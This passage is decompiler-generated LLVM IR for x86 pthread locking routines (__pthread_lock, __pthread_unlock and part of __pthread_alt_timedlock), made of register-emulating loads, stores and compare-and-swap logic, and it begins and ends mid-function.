  store i32 %v0_804caa2, i32* %edx.global-to-local, align 4
  %v0_804cabf.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804caa9

dec_label_pc_804caa9:                             ; preds = %dec_label_pc_804ca9e, %dec_label_pc_804caa2
  %v0_804cabf.pre = phi i32 [ %v0_804ca93, %dec_label_pc_804ca9e ], [ %v0_804cabf.pre.pre, %dec_label_pc_804caa2 ]
  store i32 %v2_804caad, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804cab1

dec_label_pc_804cab1:                             ; preds = %dec_label_pc_804ca93, %dec_label_pc_804caa9
  %v3_804cabf = phi i32 [ 1, %dec_label_pc_804ca93 ], [ %v2_804caad, %dec_label_pc_804caa9 ]
  %v24_804cabf = phi i32 [ %v0_804ca93, %dec_label_pc_804ca93 ], [ %v0_804cabf.pre, %dec_label_pc_804caa9 ]
  store i32 %v2_804ca93, i32* %stack_var_-20, align 4
  %v1_804cabf = inttoptr i32 %v24_804cabf to i32*
  %v2_804cabf = load i32, i32* %v1_804cabf, align 4
  %v15_804cabf = icmp eq i32 %v2_804ca93, %v2_804cabf
  %v22_804cabf = select i1 %v15_804cabf, i32 %v3_804cabf, i32 %v2_804cabf
  store i32 %v22_804cabf, i32* %v1_804cabf, align 4
  %v1_804cac3 = zext i1 %v15_804cabf to i32
  %v2_804cac3 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804cac3 = and i32 %v2_804cac3, -256
  %v4_804cac3 = or i32 %v3_804cac3, %v1_804cac3
  store i32 %v4_804cac3, i32* @ecx, align 4
  %v4_804cac6 = icmp eq i1 %v15_804cabf, false
  br i1 %v4_804cac6, label %dec_label_pc_804cab1.dec_label_pc_804ca93_crit_edge, label %dec_label_pc_804caca

dec_label_pc_804cab1.dec_label_pc_804ca93_crit_edge: ; preds = %dec_label_pc_804cab1
  %v0_804ca93.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ca93

dec_label_pc_804caca:                             ; preds = %dec_label_pc_804cab1
  br i1 %v1_804ca9a, label %dec_label_pc_804cad5, label %dec_label_pc_804cace

dec_label_pc_804cace:                             ; preds = %dec_label_pc_804caca
  %v0_804cace = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804cace, i32* @eax, align 4
  %v0_804cad0 = load i32, i32* %stack_var_-20, align 4
  %v2_804cad0 = call i32 @suspend.5(i32 %v0_804cad0, i32 0)
  br label %dec_label_pc_804cad5

dec_label_pc_804cad5:                             ; preds = %dec_label_pc_804caca, %dec_label_pc_804cace
  %v0_804cada = phi i32 [ 0, %dec_label_pc_804caca ], [ %v2_804cad0, %dec_label_pc_804cace ]
  %v2_804cad8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804cad8, i32* @ebx, align 4
  store i32 %v0_804ca86, i32* @esi, align 4
  ret i32 %v0_804cada

; uselistorder directives
  uselistorder i1 %v15_804cabf, { 1, 2, 0 }
  uselistorder i32 %v2_804cabf, { 1, 0 }
  uselistorder i32 %v0_804ca93, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cad5, { 1, 0 }
  uselistorder label %dec_label_pc_804cab1, { 1, 0 }
  uselistorder label %dec_label_pc_804caa9, { 1, 0 }
}

define i32 @__pthread_lock(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_804cadc = load i32, i32* @edi, align 4
  %v0_804cadd = load i32, i32* @esi, align 4
  %v0_804cade = load i32, i32* @ebx, align 4
  %v0_804cae2 = load i32, i32* @eax, align 4
  store i32 %v0_804cae2, i32* @ebx, align 4
  %v0_804cae4 = load i32, i32* @edx, align 4
  store i32 %v0_804cae4, i32* @edi, align 4
  %v1_804cae6 = inttoptr i32 %v0_804cae2 to i32*
  %v2_804cae6 = load i32, i32* %v1_804cae6, align 4
  %v3_804cae6 = icmp eq i32 %v2_804cae6, 0
  %v1_804cae9 = icmp eq i1 %v3_804cae6, false
  br i1 %v1_804cae9, label %dec_label_pc_804caff, label %dec_label_pc_804caeb

dec_label_pc_804caeb:                             ; preds = %entry
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 1, i32* @ecx, align 4
  %v2_804caf4 = load i32, i32* %v1_804cae6, align 4
  %v15_804caf4 = icmp eq i32 %v2_804caf4, 0
  %v22_804caf4 = select i1 %v15_804caf4, i32 1, i32 %v2_804caf4
  store i32 %v22_804caf4, i32* %v1_804cae6, align 4
  %v1_804caf8 = zext i1 %v15_804caf4 to i32
  %v2_804caf8 = load i32, i32* %edx.global-to-local, align 4
  %v3_804caf8 = and i32 %v2_804caf8, -256
  %v4_804caf8 = or i32 %v3_804caf8, %v1_804caf8
  store i32 %v4_804caf8, i32* @edx, align 4
  %v4_804cafb = icmp eq i1 %v15_804caf4, false
  %v1_804cafd = icmp eq i1 %v4_804cafb, false
  br i1 %v1_804cafd, label %dec_label_pc_804cb5e, label %dec_label_pc_804caff

dec_label_pc_804caff:                             ; preds = %dec_label_pc_804caeb, %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804cb01

dec_label_pc_804cb01:                             ; preds = %dec_label_pc_804cb30, %dec_label_pc_804cb4e, %dec_label_pc_804cb41.preheader, %dec_label_pc_804caff
  %v0_804cb01 = load i32, i32* @ebx, align 4
  %v1_804cb01 = inttoptr i32 %v0_804cb01 to i32*
  %v2_804cb01 = load i32, i32* %v1_804cb01, align 4
  store i32 %v2_804cb01, i32* @esi, align 4
  %v1_804cb03 = urem i32 %v2_804cb01, 2
  %v2_804cb03 = icmp eq i32 %v1_804cb03, 0
  %v1_804cb09 = icmp eq i1 %v2_804cb03, false
  br i1 %v1_804cb09, label %dec_label_pc_804cb17, label %dec_label_pc_804cb0b

dec_label_pc_804cb0b:                             ; preds = %dec_label_pc_804cb01
  store i32 %v2_804cb01, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  %v0_804cb29.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804cb29

dec_label_pc_804cb17:                             ; preds = %dec_label_pc_804cb01
  %v0_804cb17 = load i32, i32* @edi, align 4
  %v1_804cb17 = icmp eq i32 %v0_804cb17, 0
  %v1_804cb19 = icmp eq i1 %v1_804cb17, false
  br i1 %v1_804cb19, label %dec_label_pc_804cb22, label %dec_label_pc_804cb1b

dec_label_pc_804cb1b:                             ; preds = %dec_label_pc_804cb17
  %v0_804cb1b = call i32 @thread_self.4()
  store i32 %v0_804cb1b, i32* @edi, align 4
  br label %dec_label_pc_804cb22

dec_label_pc_804cb22:                             ; preds = %dec_label_pc_804cb17, %dec_label_pc_804cb1b
  %v0_804cb22 = phi i32 [ %v0_804cb17, %dec_label_pc_804cb17 ], [ %v0_804cb1b, %dec_label_pc_804cb1b ]
  store i32 %v0_804cb22, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804cb29

dec_label_pc_804cb29:                             ; preds = %dec_label_pc_804cb0b, %dec_label_pc_804cb22
  %v1_804cb2d = phi i32 [ %v0_804cb29.pre, %dec_label_pc_804cb0b ], [ %v0_804cb22, %dec_label_pc_804cb22 ]
  %v0_804cb0b.sink = phi i32 [ %v2_804cb01, %dec_label_pc_804cb0b ], [ %v0_804cb22, %dec_label_pc_804cb22 ]
  %v1_804cb12 = or i32 %v0_804cb0b.sink, 1
  store i32 %v1_804cb12, i32* %ecx.global-to-local, align 4
  %v1_804cb29 = icmp eq i32 %v1_804cb2d, 0
  br i1 %v1_804cb29, label %dec_label_pc_804cb30, label %dec_label_pc_804cb2d

dec_label_pc_804cb2d:                             ; preds = %dec_label_pc_804cb29
  %v0_804cb2d = load i32, i32* @esi, align 4
  %v2_804cb2d = add i32 %v1_804cb2d, 12
  %v3_804cb2d = inttoptr i32 %v2_804cb2d to i32*
  store i32 %v0_804cb2d, i32* %v3_804cb2d, align 4
  %v3_804cb32.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804cb30

dec_label_pc_804cb30:                             ; preds = %dec_label_pc_804cb29, %dec_label_pc_804cb2d
  %v3_804cb32 = phi i32 [ %v1_804cb12, %dec_label_pc_804cb29 ], [ %v3_804cb32.pre, %dec_label_pc_804cb2d ]
  %v0_804cb30 = load i32, i32* @esi, align 4
  %v0_804cb32 = load i32, i32* @ebx, align 4
  %v1_804cb32 = inttoptr i32 %v0_804cb32 to i32*
  %v2_804cb32 = load i32, i32* %v1_804cb32, align 4
  %v15_804cb32 = icmp eq i32 %v0_804cb30, %v2_804cb32
  %v22_804cb32 = select i1 %v15_804cb32, i32 %v3_804cb32, i32 %v2_804cb32
  store i32 %v22_804cb32, i32* %v1_804cb32, align 4
  %v1_804cb36 = zext i1 %v15_804cb32 to i32
  %v2_804cb36 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804cb36 = and i32 %v2_804cb36, -256
  %v4_804cb36 = or i32 %v3_804cb36, %v1_804cb36
  store i32 %v4_804cb36, i32* @ecx, align 4
  %v4_804cb39 = icmp eq i1 %v15_804cb32, false
  br i1 %v4_804cb39, label %dec_label_pc_804cb01, label %dec_label_pc_804cb3d

dec_label_pc_804cb3d:                             ; preds = %dec_label_pc_804cb30
  %v0_804cb3d = load i32, i32* @edx, align 4
  %v1_804cb3d = icmp eq i32 %v0_804cb3d, 0
  %v1_804cb3f = icmp eq i1 %v1_804cb3d, false
  br i1 %v1_804cb3f, label %dec_label_pc_804cb58.preheader, label %dec_label_pc_804cb41.preheader

dec_label_pc_804cb58.preheader:                   ; preds = %dec_label_pc_804cb3d
  %v0_804cb5814 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cb5815 = add i32 %v0_804cb5814, -1
  store i32 %v1_804cb5815, i32* %ebp.global-to-local, align 4
  %v10_804cb5921 = icmp eq i32 %v0_804cb5814, 0
  %v1_804cb5c22 = icmp eq i1 %v10_804cb5921, false
  br i1 %v1_804cb5c22, label %dec_label_pc_804cb51, label %dec_label_pc_804cb5e

dec_label_pc_804cb41.preheader:                   ; preds = %dec_label_pc_804cb3d
  %v0_804cb41.pre = load i32, i32* @edi, align 4
  store i32 %v0_804cb41.pre, i32* @eax, align 4
  %v2_804cb4323 = call i32 @suspend.5(i32 %v0_804cade, i32 %v0_804cadd)
  %v0_804cb4824 = load i32, i32* @edi, align 4
  %v1_804cb4825 = add i32 %v0_804cb4824, 12
  %v2_804cb4826 = inttoptr i32 %v1_804cb4825 to i32*
  %v3_804cb4827 = load i32, i32* %v2_804cb4826, align 4
  %v4_804cb4828 = icmp eq i32 %v3_804cb4827, 0
  br i1 %v4_804cb4828, label %dec_label_pc_804cb01, label %dec_label_pc_804cb4e

dec_label_pc_804cb4e:                             ; preds = %dec_label_pc_804cb41.preheader, %dec_label_pc_804cb4e
  %v0_804cb4829 = phi i32 [ %v0_804cb48, %dec_label_pc_804cb4e ], [ %v0_804cb4824, %dec_label_pc_804cb41.preheader ]
  %v0_804cb4e = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cb4e = add i32 %v0_804cb4e, 1
  store i32 %v1_804cb4e, i32* %ebp.global-to-local, align 4
  store i32 %v0_804cb4829, i32* @eax, align 4
  %v2_804cb43 = call i32 @suspend.5(i32 %v0_804cade, i32 %v0_804cadd)
  %v0_804cb48 = load i32, i32* @edi, align 4
  %v1_804cb48 = add i32 %v0_804cb48, 12
  %v2_804cb48 = inttoptr i32 %v1_804cb48 to i32*
  %v3_804cb48 = load i32, i32* %v2_804cb48, align 4
  %v4_804cb48 = icmp eq i32 %v3_804cb48, 0
  br i1 %v4_804cb48, label %dec_label_pc_804cb01, label %dec_label_pc_804cb4e

dec_label_pc_804cb51:                             ; preds = %dec_label_pc_804cb58.preheader, %dec_label_pc_804cb51
  %v0_804cb51 = load i32, i32* @edi, align 4
  store i32 %v0_804cb51, i32* @eax, align 4
  %v0_804cb53 = call i32 @restart.3()
  %v0_804cb58 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cb58 = add i32 %v0_804cb58, -1
  store i32 %v1_804cb58, i32* %ebp.global-to-local, align 4
  %v10_804cb59 = icmp eq i32 %v0_804cb58, 0
  %v1_804cb5c = icmp eq i1 %v10_804cb59, false
  br i1 %v1_804cb5c, label %dec_label_pc_804cb51, label %dec_label_pc_804cb5e

dec_label_pc_804cb5e:                             ; preds = %dec_label_pc_804cb58.preheader, %dec_label_pc_804cb51, %dec_label_pc_804caeb
  %v0_804cb65 = phi i32 [ %v2_804caf4, %dec_label_pc_804caeb ], [ %v0_804cb30, %dec_label_pc_804cb58.preheader ], [ %v0_804cb53, %dec_label_pc_804cb51 ]
  store i32 %v0_804cade, i32* @ebx, align 4
  store i32 %v0_804cadd, i32* @esi, align 4
  store i32 %v0_804cadc, i32* @edi, align 4
  ret i32 %v0_804cb65

; uselistorder directives
  uselistorder i32 %v0_804cb48, { 1, 0 }
  uselistorder i1 %v15_804cb32, { 1, 2, 0 }
  uselistorder i32 %v2_804cb32, { 1, 0 }
  uselistorder i32 %v0_804cb22, { 1, 0, 2 }
  uselistorder i32 %v2_804cb01, { 2, 1, 0, 3 }
  uselistorder i1 %v15_804caf4, { 1, 0, 2 }
  uselistorder i32 %v2_804caf4, { 0, 2, 1 }
  uselistorder i32 %v0_804cade, { 1, 2, 0 }
  uselistorder i32 %v0_804cadd, { 1, 2, 0 }
  uselistorder i32* %ecx.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder label %dec_label_pc_804cb5e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cb51, { 1, 0 }
  uselistorder label %dec_label_pc_804cb4e, { 1, 0 }
  uselistorder label %dec_label_pc_804cb30, { 1, 0 }
  uselistorder label %dec_label_pc_804cb29, { 1, 0 }
  uselistorder label %dec_label_pc_804cb22, { 1, 0 }
  uselistorder label %dec_label_pc_804cb01, { 1, 2, 0, 3 }
}

define i32 @__pthread_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp27 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804cb69 = load i32, i32* @ebx, align 4
  store i32 %v0_804cb69, i32* %stack_var_-16, align 4
  store i32 %tmp27, i32* @ecx, align 4
  br label %dec_label_pc_804cb82

dec_label_pc_804cb73:                             ; preds = %dec_label_pc_804cb82
  %v2_804cb77 = load i32, i32* %v1_804cb82, align 4
  %v15_804cb77 = icmp eq i32 %v2_804cb77, 1
  %v22_804cb77 = select i1 %v15_804cb77, i32 0, i32 %v2_804cb77
  store i32 %v22_804cb77, i32* %v1_804cb82, align 4
  %v1_804cb7b = zext i1 %v15_804cb77 to i32
  %v2_804cb7b = load i32, i32* %edx.global-to-local, align 4
  %v3_804cb7b = and i32 %v2_804cb7b, -256
  %v4_804cb7b = or i32 %v3_804cb7b, %v1_804cb7b
  store i32 %v4_804cb7b, i32* @edx, align 4
  %v4_804cb7e = icmp eq i1 %v15_804cb77, false
  %v1_804cb80 = icmp eq i1 %v4_804cb7e, false
  br i1 %v1_804cb80, label %dec_label_pc_804cbfa.loopexit, label %dec_label_pc_804cb82.backedge

dec_label_pc_804cb82.backedge:                    ; preds = %dec_label_pc_804cb73, %dec_label_pc_804cbbb
  %v0_804cb82.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804cb82

dec_label_pc_804cb82:                             ; preds = %dec_label_pc_804cb82.backedge, %entry
  %v0_804cb77 = phi i32 [ %v0_804cb82.pre, %dec_label_pc_804cb82.backedge ], [ %tmp27, %entry ]
  %v1_804cb82 = inttoptr i32 %v0_804cb77 to i32*
  %v2_804cb82 = load i32, i32* %v1_804cb82, align 4
  store i32 %v2_804cb82, i32* %edx.global-to-local, align 4
  %v9_804cb84 = icmp eq i32 %v2_804cb82, 1
  br i1 %v9_804cb84, label %dec_label_pc_804cb73, label %dec_label_pc_804cb89

dec_label_pc_804cb89:                             ; preds = %dec_label_pc_804cb82
  %v1_804cb8b = and i32 %v2_804cb82, -2
  store i32 %v1_804cb8b, i32* %edi.global-to-local, align 4
  %v1_804cbb33 = icmp eq i32 %v1_804cb8b, 0
  %v1_804cbb510 = icmp eq i1 %v1_804cbb33, false
  br i1 %v1_804cbb510, label %dec_label_pc_804cb9d, label %dec_label_pc_804cbbb

dec_label_pc_804cb9d:                             ; preds = %dec_label_pc_804cb89, %dec_label_pc_804cbaa
  %v0_804cbb726 = phi i32 [ %v0_804cbb725, %dec_label_pc_804cbaa ], [ %v0_804cb77, %dec_label_pc_804cb89 ]
  %v0_804cba5 = phi i32 [ %v1_804cbaa, %dec_label_pc_804cbaa ], [ %v0_804cb77, %dec_label_pc_804cb89 ]
  %v3_804cba0 = phi i32 [ %v3_804cba021, %dec_label_pc_804cbaa ], [ 0, %dec_label_pc_804cb89 ]
  %v0_804cbaa = phi i32 [ %v1_804cbb0, %dec_label_pc_804cbaa ], [ %v1_804cb8b, %dec_label_pc_804cb89 ]
  %v1_804cb9d = add i32 %v0_804cbaa, 24
  %v2_804cb9d = inttoptr i32 %v1_804cb9d to i32*
  %v3_804cb9d = load i32, i32* %v2_804cb9d, align 4
  store i32 %v3_804cb9d, i32* @ebx, align 4
  %v5_804cba3 = icmp slt i32 %v3_804cb9d, %v3_804cba0
  br i1 %v5_804cba3, label %dec_label_pc_804cbaa, label %dec_label_pc_804cba5

dec_label_pc_804cba5:                             ; preds = %dec_label_pc_804cb9d
  br label %dec_label_pc_804cbaa

dec_label_pc_804cbaa:                             ; preds = %dec_label_pc_804cb9d, %dec_label_pc_804cba5
  %v0_804cbb725 = phi i32 [ %v0_804cbb726, %dec_label_pc_804cb9d ], [ %v0_804cba5, %dec_label_pc_804cba5 ]
  %v3_804cba021 = phi i32 [ %v3_804cba0, %dec_label_pc_804cb9d ], [ %v3_804cb9d, %dec_label_pc_804cba5 ]
  %v1_804cbaa = add i32 %v0_804cbaa, 12
  %v2_804cbad = inttoptr i32 %v1_804cbaa to i32*
  %v3_804cbad = load i32, i32* %v2_804cbad, align 4
  %v1_804cbb0 = and i32 %v3_804cbad, -2
  %v1_804cbb3 = icmp eq i32 %v1_804cbb0, 0
  %v1_804cbb5 = icmp eq i1 %v1_804cbb3, false
  br i1 %v1_804cbb5, label %dec_label_pc_804cb9d, label %dec_label_pc_804cbb7

dec_label_pc_804cbb7:                             ; preds = %dec_label_pc_804cbaa
  %v12_804cbb7 = icmp eq i32 %v0_804cbb725, %v0_804cb77
  %v1_804cbb9 = icmp eq i1 %v12_804cbb7, false
  br i1 %v1_804cbb9, label %dec_label_pc_804cbd0, label %dec_label_pc_804cbbb

dec_label_pc_804cbbb:                             ; preds = %dec_label_pc_804cb89, %dec_label_pc_804cbb7
  %v1_804cbbb = add i32 %v1_804cb8b, 12
  %v2_804cbbb = inttoptr i32 %v1_804cbbb to i32*
  %v3_804cbbb = load i32, i32* %v2_804cbbb, align 4
  %v1_804cbc0 = and i32 %v3_804cbbb, -2
  store i32 %v1_804cbc0, i32* @ebx, align 4
  %v2_804cbc3 = load i32, i32* %v1_804cb82, align 4
  %v15_804cbc3 = icmp eq i32 %v2_804cb82, %v2_804cbc3
  %v22_804cbc3 = select i1 %v15_804cbc3, i32 %v1_804cbc0, i32 %v2_804cbc3
  store i32 %v22_804cbc3, i32* %v1_804cb82, align 4
  %v1_804cbc7 = zext i1 %v15_804cbc3 to i32
  %v2_804cbc7 = load i32, i32* %edx.global-to-local, align 4
  %v3_804cbc7 = and i32 %v2_804cbc7, -256
  %v4_804cbc7 = or i32 %v3_804cbc7, %v1_804cbc7
  store i32 %v4_804cbc7, i32* %edx.global-to-local, align 4
  %v4_804cbca = icmp eq i1 %v15_804cbc3, false
  br i1 %v4_804cbca, label %dec_label_pc_804cb82.backedge, label %dec_label_pc_804cbec

dec_label_pc_804cbd0:                             ; preds = %dec_label_pc_804cbb7
  %v1_804cbd0 = inttoptr i32 %v0_804cbb725 to i32*
  %v2_804cbd0 = load i32, i32* %v1_804cbd0, align 4
  %v1_804cbd2 = and i32 %v2_804cbd0, -2
  store i32 %v1_804cbd2, i32* %edi.global-to-local, align 4
  %v1_804cbd5 = add i32 %v1_804cbd2, 12
  %v2_804cbd5 = inttoptr i32 %v1_804cbd5 to i32*
  %v3_804cbd5 = load i32, i32* %v2_804cbd5, align 4
  store i32 %v3_804cbd5, i32* %v1_804cbd0, align 4
  br label %dec_label_pc_804cbda

dec_label_pc_804cbda:                             ; preds = %dec_label_pc_804cbda, %dec_label_pc_804cbd0
  %v0_804cbda = load i32, i32* @ecx, align 4
  %v1_804cbda = inttoptr i32 %v0_804cbda to i32*
  %v2_804cbda = load i32, i32* %v1_804cbda, align 4
  %v1_804cbde = and i32 %v2_804cbda, -2
  store i32 %v1_804cbde, i32* %edx.global-to-local, align 4
  %v2_804cbe1 = load i32, i32* %v1_804cbda, align 4
  %v15_804cbe1 = icmp eq i32 %v2_804cbda, %v2_804cbe1
  %v22_804cbe1 = select i1 %v15_804cbe1, i32 %v1_804cbde, i32 %v2_804cbe1
  store i32 %v22_804cbe1, i32* %v1_804cbda, align 4
  %v1_804cbe5 = zext i1 %v15_804cbe1 to i32
  %v2_804cbe5 = load i32, i32* %edx.global-to-local, align 4
  %v3_804cbe5 = and i32 %v2_804cbe5, -256
  %v4_804cbe5 = or i32 %v3_804cbe5, %v1_804cbe5
  store i32 %v4_804cbe5, i32* %edx.global-to-local, align 4
  %v4_804cbe8 = icmp eq i1 %v15_804cbe1, false
  br i1 %v4_804cbe8, label %dec_label_pc_804cbda, label %dec_label_pc_804cbec

dec_label_pc_804cbec:                             ; preds = %dec_label_pc_804cbbb, %dec_label_pc_804cbda
  %v0_804cbec = load i32, i32* %edi.global-to-local, align 4
  %v1_804cbec = add i32 %v0_804cbec, 12
  %v2_804cbec = inttoptr i32 %v1_804cbec to i32*
  store i32 0, i32* %v2_804cbec, align 4
  %v0_804cbf3 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804cbf3, i32* @eax, align 4
  %v0_804cbf5 = call i32 @restart.3()
  br label %dec_label_pc_804cbfa

dec_label_pc_804cbfa.loopexit:                    ; preds = %dec_label_pc_804cb73
  br label %dec_label_pc_804cbfa

dec_label_pc_804cbfa:                             ; preds = %dec_label_pc_804cbfa.loopexit, %dec_label_pc_804cbec
  %v2_804cbff = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cbff, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i1 %v15_804cbe1, { 1, 2, 0 }
  uselistorder i32 %v2_804cbe1, { 1, 0 }
  uselistorder i1 %v15_804cbc3, { 1, 2, 0 }
  uselistorder i32 %v2_804cbc3, { 1, 0 }
  uselistorder i32 %v1_804cbb0, { 1, 0 }
  uselistorder i32 %v1_804cbaa, { 1, 0 }
  uselistorder i32 %v3_804cba0, { 1, 0 }
  uselistorder i32 %v1_804cb8b, { 1, 0, 2, 3 }
  uselistorder i32* %v1_804cb82, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_804cb77, { 2, 0, 1, 3 }
  uselistorder i1 %v15_804cb77, { 1, 2, 0 }
  uselistorder i32 %v2_804cb77, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 ()* @restart.3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cbec, { 1, 0 }
  uselistorder label %dec_label_pc_804cbbb, { 1, 0 }
  uselistorder label %dec_label_pc_804cbaa, { 1, 0 }
  uselistorder label %dec_label_pc_804cb9d, { 1, 0 }
  uselistorder label %dec_label_pc_804cb82.backedge, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %v0_804cc06 = load i32, i32* @esi, align 4
  %v0_804cc07 = load i32, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_8062fe8.173 to i32), i32* @eax, align 4
  store i32 0, i32* @esi, align 4
  store i32 %tmp7, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_804cc1a = call i32 @__pthread_acquire(i32 %v0_804cc07)
  %v0_804cc1f = load i32, i32* @global_var_8062fe4.174, align 4
  %v1_804cc24 = icmp eq i32 %v0_804cc1f, 0
  br i1 %v1_804cc24, label %dec_label_pc_804cc31, label %dec_label_pc_804cc31.thread

dec_label_pc_804cc31.thread:                      ; preds = %entry
  store i32 %v0_804cc1f, i32* @esi, align 4
  %v1_804cc2a = inttoptr i32 %v0_804cc1f to i32*
  %v2_804cc2a = load i32, i32* %v1_804cc2a, align 4
  store i32 %v2_804cc2a, i32* @global_var_8062fe4.174, align 4
  store i32 0, i32* @global_var_8062fe8.173, align 8
  br label %dec_label_pc_804cc65

dec_label_pc_804cc31:                             ; preds = %entry
  %v0_804cc3b.pre = load i32, i32* @esi, align 4
  store i32 0, i32* @global_var_8062fe8.173, align 8
  %v1_804cc3b = icmp eq i32 %v0_804cc3b.pre, 0
  %v1_804cc3d = icmp eq i1 %v1_804cc3b, false
  br i1 %v1_804cc3d, label %dec_label_pc_804cc65, label %dec_label_pc_804cc3f

dec_label_pc_804cc3f:                             ; preds = %dec_label_pc_804cc31
  store i32 12, i32* %stack_var_-44, align 4
  %v1_804cc44 = call i32 @malloc(i32 12)
  store i32 %v1_804cc44, i32* @esi, align 4
  %v1_804cc4e = icmp eq i32 %v1_804cc44, 0
  %v1_804cc50 = icmp eq i1 %v1_804cc4e, false
  br i1 %v1_804cc50, label %dec_label_pc_804cc65, label %dec_label_pc_804cc52

dec_label_pc_804cc52:                             ; preds = %dec_label_pc_804cc3f
  %v0_804cc55 = load i32, i32* @edi, align 4
  store i32 %v0_804cc55, i32* %stack_var_-44, align 4
  %v3_804cc56 = inttoptr i32 %v0_804cc55 to i32*
  %v4_804cc56 = call i32 @__pthread_alt_lock(i32* %v3_804cc56, i32 %v1_804cc44, i32 %v1_804cc44)
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cccb

dec_label_pc_804cc65:                             ; preds = %dec_label_pc_804cc31.thread, %dec_label_pc_804cc3f, %dec_label_pc_804cc31, %dec_label_pc_804cc80
  %v0_804cc65 = load i32, i32* @edi, align 4
  %v1_804cc65 = inttoptr i32 %v0_804cc65 to i32*
  %v2_804cc65 = load i32, i32* %v1_804cc65, align 4
  store i32 %v2_804cc65, i32* @ebx, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804cc6c = icmp eq i32 %v2_804cc65, 0
  br i1 %v1_804cc6c, label %dec_label_pc_804cc65.dec_label_pc_804cc80_crit_edge, label %dec_label_pc_804cc70

dec_label_pc_804cc65.dec_label_pc_804cc80_crit_edge: ; preds = %dec_label_pc_804cc65
  %v0_804cc80.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cc80

dec_label_pc_804cc70:                             ; preds = %dec_label_pc_804cc65
  %v0_804cc70 = load i32, i32* @ebp, align 4
  %v1_804cc70 = icmp eq i32 %v0_804cc70, 0
  %v1_804cc72 = icmp eq i1 %v1_804cc70, false
  br i1 %v1_804cc72, label %dec_label_pc_804cc7b, label %dec_label_pc_804cc74

dec_label_pc_804cc74:                             ; preds = %dec_label_pc_804cc70
  %v0_804cc74 = call i32 @thread_self.4()
  store i32 %v0_804cc74, i32* @ebp, align 4
  br label %dec_label_pc_804cc7b

dec_label_pc_804cc7b:                             ; preds = %dec_label_pc_804cc70, %dec_label_pc_804cc74
  %v0_804cc7b = phi i32 [ %v0_804cc70, %dec_label_pc_804cc70 ], [ %v0_804cc74, %dec_label_pc_804cc74 ]
  %v1_804cc7b = load i32, i32* @esi, align 4
  %v2_804cc7b = add i32 %v1_804cc7b, 4
  %v3_804cc7b = inttoptr i32 %v2_804cc7b to i32*
  store i32 %v0_804cc7b, i32* %v3_804cc7b, align 4
  %v0_804cc7e = load i32, i32* @esi, align 4
  store i32 %v0_804cc7e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cc80

dec_label_pc_804cc80:                             ; preds = %dec_label_pc_804cc65.dec_label_pc_804cc80_crit_edge, %dec_label_pc_804cc7b
  %v0_804cc80 = phi i32 [ %v0_804cc80.pre, %dec_label_pc_804cc65.dec_label_pc_804cc80_crit_edge ], [ %v0_804cc7e, %dec_label_pc_804cc7b ]
  %v1_804cc80 = add i32 %v0_804cc80, 8
  %v2_804cc80 = inttoptr i32 %v1_804cc80 to i32*
  store i32 0, i32* %v2_804cc80, align 4
  %v1_804cc87 = load i32, i32* @esi, align 4
  %v2_804cc87 = inttoptr i32 %v1_804cc87 to i32*
  store i32 %v2_804cc65, i32* %v2_804cc87, align 4
  %v0_804cc8b = load i32, i32* @edi, align 4
  %v1_804cc8b = inttoptr i32 %v0_804cc8b to i32*
  %v2_804cc8b = load i32, i32* %v1_804cc8b, align 4
  %v3_804cc8b = load i32, i32* %edx.global-to-local, align 4
  %v15_804cc8b = icmp eq i32 %v2_804cc65, %v2_804cc8b
  %v22_804cc8b = select i1 %v15_804cc8b, i32 %v3_804cc8b, i32 %v2_804cc8b
  store i32 %v22_804cc8b, i32* %v1_804cc8b, align 4
  %v1_804cc8f = zext i1 %v15_804cc8b to i32
  %v2_804cc8f = load i32, i32* %edx.global-to-local, align 4
